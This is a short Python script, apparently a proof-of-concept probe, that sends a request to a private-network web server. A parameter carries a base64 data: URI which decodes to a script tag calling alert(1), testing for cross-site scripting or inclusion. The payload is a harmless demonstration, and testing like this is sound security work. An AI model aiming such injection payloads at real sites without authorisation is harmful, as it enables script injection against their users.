import requests

r = requests.get('http://192.168.1.20/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==')
print(r.text)
